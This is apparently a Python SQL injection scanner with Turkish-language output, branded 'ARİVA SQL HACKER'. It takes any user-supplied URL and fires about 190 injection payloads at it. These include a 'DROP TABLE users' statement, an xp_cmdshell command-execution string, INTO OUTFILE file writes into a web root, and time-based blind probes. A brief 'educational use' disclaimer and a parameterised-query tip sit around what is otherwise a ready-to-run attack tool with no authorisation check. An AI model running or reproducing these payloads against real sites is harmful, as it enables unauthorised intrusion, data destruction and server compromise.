import requests
import time
import sys
from colorama import init, Fore, Style
import random

init()

NEON_GREEN = Fore.LIGHTGREEN_EX
NEON_CYAN = Fore.LIGHTCYAN_EX
NEON_RED = Fore.LIGHTRED_EX
NEON_YELLOW = Fore.LIGHTYELLOW_EX
RESET = Style.RESET_ALL

def glitch_text(text, delay=0.05):
    for char in text:
        sys.stdout.write(f"{NEON_CYAN}{char}{RESET}")
        sys.stdout.flush()
        time.sleep(delay)
    print()

def print_header():
    header = "ARİVA SQL HACKER"
    for _ in range(3):
        sys.stdout.write(f"\r{NEON_GREEN}{header}{RESET} " + random.choice(["✨", "⚡", "★"]))
        sys.stdout.flush()
        time.sleep(0.3)
        sys.stdout.write(f"\r{' ' * (len(header) + 2)}")
        sys.stdout.flush()
        time.sleep(0.2)
    glitch_text(header + " v2.0")
    print(f"{NEON_YELLOW}✨ BU TOOL EĞİTİM AMAÇLIDIR HERHANGİ BİR KÖTÜYE KULLANIMDAN KULLANICI SORUMLUDUR. ✨{RESET}")

def loading_animation():
    animations = ["💾", "💿", "🔥", "💥", "⚡", "🌩️", "🌀", "✨"]
    message = "A N A L İ Z  E D İ L İ Y O R"
    end_time = time.time() + 3
    while time.time() < end_time:
        for anim in animations:
            sys.stdout.write(f"\r{NEON_RED}{message} {anim}{RESET}")
            sys.stdout.flush()
            time.sleep(0.15)
            for i in range(len(message)):
                sys.stdout.write(f"\r{NEON_RED}{message[:i]}{NEON_YELLOW}{message[i:]}{anim}{RESET}")
                sys.stdout.flush()
                time.sleep(0.02)
    print()

def sql_injection_test(url):
    payloads = [
        "'",
        "\"",
        "';--",
        "1' OR '1'='1",
        "1; DROP TABLE users--",
        "' OR 'a'='a",
        "1 UNION SELECT NULL--",
        "' OR 1=1--",
        "1' OR '1'='2",
        "' UNION SELECT 1,2,3--",
        "1' AND 1=1",
        "1' ORDER BY 1--",
        "1' ORDER BY 99--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "' OR EXISTS(SELECT * FROM users)--",
        "1' AND SUBSTRING((SELECT database()),1,1)='a'",
        "1' UNION ALL SELECT NULL,@@version--",
        "' OR 1=1 LIMIT 1--",
        "1' AND 1=2 UNION SELECT 'admin','password'--",
        "1' HAVING 1=1--",
        "1' GROUP BY 1--",
        "1' INTO OUTFILE '/tmp/test'--",
        "' AND SLEEP(5)--",
        "1' OR ELT(1=1,1)--",
        "' OR BENCHMARK(1000000,MD5(1))--",
        "1' AND 1=2--",
        "' OR 'x'='x",
        "1' UNION SELECT user(),version()--",
        "' OR 1=1 ORDER BY 1--",
        "1'; EXEC master..xp_cmdshell 'dir'--",
        "1' OR 1=1 UNION SELECT NULL--",
        "' AND SUBSTRING(@@version,1,1)='5'",
        "1' OR SLEEP(5)--",
        "' OR 1=1 GROUP BY 1--",
        "1' UNION SELECT 1,@@version,database()--",
        "' OR '1' LIKE '1",
        "1' AND EXTRACTVALUE(1, '1')--",
        "1' OR 1=1 HAVING 1=1--",
        "1' UNION ALL SELECT NULL,NULL--",
        "' OR IF(1=1,1,0)--",
        "1' AND 1=(SELECT 1)--",
        "' OR LENGTH(database())>1--",
        "1' OR 1=1 INTO OUTFILE '/var/www/test'--",
        "' AND 1=CONVERT(int,'a')--",
        "1' UNION SELECT NULL,database()--",
        "' OR 1=1 AND 'a'='a",
        "1' OR RAND()--",
        "1'; SELECT * FROM users--",
        "' OR ASCII(1)=49--",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
        "' OR 1=1 LIMIT 0,1--",
        "1' UNION SELECT 1,2--",
        "' AND 1=IF(1=1,1,0)--",
        "1' OR 1=1 ORDER BY 2--",
        "' OR 1=1 UNION ALL SELECT NULL--",
        "1' AND SUBSTRING(@@version,1,1)='M'",
        "' OR 1=1 INTO OUTFILE '/tmp/out'--",
        "1' OR 1=CAST('1' AS SIGNED)--",
        "1' UNION SELECT NULL,user()--",
        "' OR 1=1 AND SLEEP(3)--",
        "1' AND 1=(SELECT TOP 1 1)--",
        "' OR SUBSTRING(database(),1,1)='t'",
        "1' OR 1=1 ORDER BY 10--",
        "' AND 1=CAST('a' AS int)--",
        "1' UNION SELECT NULL,1,2--",
        "' OR 1=1 LIMIT 1,1--",
        "1' AND LENGTH(@@version)>1--",
        "' OR 1=1 AND RAND()--",
        "1' OR 1=1 UNION SELECT 1,2,3--",
        "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
        "1' OR 1=1 ORDER BY 100--",
        "' OR 1=1 AND 'x' LIKE 'x'",
        "1' UNION SELECT NULL,@@hostname--",
        "' OR 1=1 AND SUBSTRING(@@version,1,1)='1'",
        "1' AND 1=1 LIMIT 1--",
        "' OR 1=1 AND LENGTH(database())>5--",
        "1' OR 1=1 UNION ALL SELECT 1,2--",
        "' AND SLEEP(2)--",
        "1' OR 1=1 AND ASCII(database())>0--",
        "' OR 1=1 GROUP BY 2--",
        "1' UNION SELECT NULL,version(),user()--",
        "' OR 1=1 HAVING 2=2--",
        "1' AND 1=1 ORDER BY 1--",
        "' OR 1=1 AND 1=2--",
        "1' OR 1=1 LIMIT 2,1--",
        "' AND BENCHMARK(500000,MD5(1))--",
        "1' OR 1=1 UNION SELECT NULL,database(),user()--",
        "' OR 1=1 AND '1'='2",
        "1' AND SUBSTRING(user(),1,1)='a'",
        "' OR 1=1 ORDER BY RAND()--",
        "1' OR 1=1 AND 1=CAST('1' AS int)--",
        "' AND 1=(SELECT 1 FROM dual)--",
        "1' OR 1=1 UNION SELECT 1,database()--",
        "' OR 1=1 AND IF(1=1,SLEEP(1),0)--",
        "1' OR 1=1 LIMIT 0,2--",
        "' AND 1=1 UNION SELECT NULL--",
        "1' OR 1=1 AND LENGTH(user())>1--",
        "' OR 1=1 AND SUBSTRING(user(),1,1)='r'",
        "1' OR 1=1 AND 1!=2--",
        "' OR 1=1 AND database() LIKE 't%'",
        "1' UNION SELECT NULL,1,version()--",
        "' OR 1=1 AND user() LIKE 'r%'",
        "1' OR 1=1 AND SUBSTRING(database(),2,1)='e'",
        "' AND SLEEP(10)--",
        "1' OR 1=1 AND 1=IFNULL(1,1)--",
        "1' UNION SELECT NULL,database(),@@version--",
        "' OR 1=1 AND ASCII(user())>97--",
        "1' OR 1=1 ORDER BY 3--",
        "' AND 1=1 UNION SELECT 1,2,3--",
        "1' OR 1=1 AND LENGTH(database())=8--",
        "' OR 1=1 AND 'test'='test'",
        "1' OR 1=1 UNION SELECT NULL,1,user()--",
        "' OR 1=1 AND SUBSTRING(@@version,2,1)='i'",
        "1' OR 1=1 AND 1=ABS(1)--",
        "' AND 1=1 LIMIT 0,1--",
        "1' OR 1=1 AND SUBSTRING(user(),2,1)='o'",
        "' OR 1=1 AND database()='mysql'",
        "1' UNION SELECT NULL,@@version,user()--",
        "' OR 1=1 AND LENGTH(@@hostname)>3--",
        "1' OR 1=1 AND 1=CEIL(1)--",
        "' AND 1=1 UNION ALL SELECT NULL,database()--",
        "1' OR 1=1 AND SUBSTRING(database(),1,2)='my'",
        "' OR 1=1 AND user()='root'",
        "1' OR 1=1 AND 1=FLOOR(1)--",
        "' AND SLEEP(1)--",
        "1' OR 1=1 AND ASCII(@@version)>48--",
        "' OR 1=1 AND LENGTH(user())=4--",
        "1' UNION SELECT 1,database(),version()--",
        "' OR 1=1 AND SUBSTRING(database(),3,1)='s'",
        "1' OR 1=1 AND 1=ROUND(1)--",
        "' AND 1=1 UNION SELECT NULL,@@version--",
        "1' OR 1=1 AND SUBSTRING(user(),3,1)='o'",
        "' OR 1=1 AND database() LIKE 'm%'",
        "1' OR 1=1 AND 1=SIGN(1)--",
        "' AND BENCHMARK(100000,SHA1(1))--",
        "1' OR 1=1 AND SUBSTRING(@@version,3,1)='c'",
        "' OR 1=1 AND LENGTH(database())>10--",
        "1' UNION SELECT NULL,user(),database()--",
        "' OR 1=1 AND ASCII(database())=109--",
        "1' OR 1=1 AND 1=EXP(0)--",
        "' AND 1=1 UNION SELECT 1,database()--",
        "1' OR 1=1 AND SUBSTRING(user(),4,1)='t'",
        "' OR 1=1 AND @@version LIKE '5%'",
        "1' OR 1=1 AND 1=LOG(1)--",
        "' AND SLEEP(3)--",
        "1' OR 1=1 AND ASCII(user())=114--",
        "' OR 1=1 AND LENGTH(@@version)=8--",
        "1' UNION SELECT NULL,1,database()--",
        "' OR 1=1 AND SUBSTRING(database(),4,1)='q'",
        "1' OR 1=1 AND 1=SQRT(1)--",
        "' AND 1=1 UNION ALL SELECT 1,version()--",
        "1' OR 1=1 AND SUBSTRING(user(),5,1)='@'",
        "' OR 1=1 AND database() LIKE '%sql'",
        "1' OR 1=1 AND 1=POWER(1,1)--",
        "' AND BENCHMARK(200000,MD5(1))--",
        "1' OR 1=1 AND SUBSTRING(@@version,4,1)='r'",
        "' OR 1=1 AND LENGTH(user())>5--",
        "1' UNION SELECT NULL,version(),database()--",
        "' OR 1=1 AND ASCII(@@hostname)>0--",
        "1' OR 1=1 AND 1=LN(1)--",
        "' AND 1=1 UNION SELECT NULL,user()--",
        "1' OR 1=1 AND SUBSTRING(database(),5,1)='l'",
        "' OR 1=1 AND user() LIKE '%root%'",
        "1' OR 1=1 AND 1=COS(0)--",
        "' AND SLEEP(4)--",
        "1' OR 1=1 AND ASCII(database())>109--",
        "' OR 1=1 AND LENGTH(@@version)>5--",
        "1' UNION SELECT 1,user(),database()--",
        "' OR 1=1 AND SUBSTRING(user(),6,1)='l'",
        "1' OR 1=1 AND 1=SIN(0)--",
        "' AND 1=1 UNION ALL SELECT NULL,@@hostname--",
        "1' OR 1=1 AND SUBSTRING(@@version,5,1)='o'",
        "' OR 1=1 AND database()='test'",
        "1' OR 1=1 AND 1=TAN(0)--",
        "' AND BENCHMARK(300000,SHA1(1))--",
        "1' OR 1=1 AND SUBSTRING(database(),6,1)=' '",
        "' OR 1=1 AND LENGTH(user())=6--",
        "1' UNION SELECT NULL,database(),version()--",
        "' OR 1=1 AND ASCII(user())>114--",
        "1' OR 1=1 AND 1=ATAN(1)--",
        "' AND 1=1 UNION SELECT 1,@@version,user()--",
        "1' OR 1=1 AND SUBSTRING(@@version,6,1)='s'",
        "' OR 1=1 AND database() LIKE '%test%'",
        "1' OR 1=1 AND 1=PI()--",
        "' AND SLEEP(6)--",
        "1' OR 1=1 AND ASCII(@@version)>51--",
        "' OR 1=1 AND LENGTH(database())=5--",
        "1' UNION SELECT NULL,@@version,database()--"
    ]
    glitch_text(f"🎯 HEDEF: {url}")
    found_vulnerabilities = []

    for payload in payloads:
        test_url = url + payload
        sys.stdout.write(f"\r{NEON_YELLOW}⚡ PAYLOAD DENENİYOR: {payload}{RESET}")
        sys.stdout.flush()
        time.sleep(0.3)
        try:
            response = requests.get(test_url, timeout=5)
            response_text = response.text.lower()
            if any(keyword in response_text for keyword in ["error", "sql", "mysql", "syntax"]):
                found_vulnerabilities.append(payload)
        except requests.exceptions.Timeout:
            glitch_text(f"⏰ ZAMAN AŞIMI: {test_url}")
        except requests.exceptions.RequestException as e:
            glitch_text(f"💀 HATA: {str(e)}")
            if "NameResolutionError" in str(e):
                glitch_text("🔍 DNS HATASI: Alan adı çözülemedi!")
        time.sleep(0.5)
    return found_vulnerabilities if found_vulnerabilities else None

def display_results(url, result):
    print("\n" + NEON_CYAN + "═" * 60 + RESET)
    if result:
        glitch_text("🔥 SQL AÇIĞI BULUNDU 🔥")
        for vuln in result:
            sys.stdout.write(f"{NEON_RED}🎯 AÇIK URL: {url}{vuln}{RESET}\n")
            sys.stdout.flush()
            glitch_text(f"💉 KULLANILAN PAYLOAD: '{vuln}'")
        glitch_text("💡 HACKER İPUCU: Parametreli sorgular kullanın!")
    else:
        glitch_text("🛡️ AÇIK BULUNAMADI 🛡️")
    print(NEON_CYAN + "═" * 60 + RESET)

def main():
    print_header()
    glitch_text("🌐 TEST EDİLECEK URL’Yİ GİR:")
    
    while True:
        url = input(f"{NEON_GREEN}➡️ {RESET}")
        if url.startswith("http://") or url.startswith("https://"):
            break
        glitch_text("❌ GEÇERSİZ URL! HTTP/HTTPS İLE BAŞLAMALI")

    loading_animation()
    result = sql_injection_test(url)
    display_results(url, result)

    glitch_text("🔄 YENİDEN TEST? (E/H)")
    retry = input(f"{NEON_GREEN}➡️ {RESET}")
    if retry.lower() == "e":
        print()
        main()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        glitch_text("🛑 HACKER TARAFINDAN DURDURULDU!")
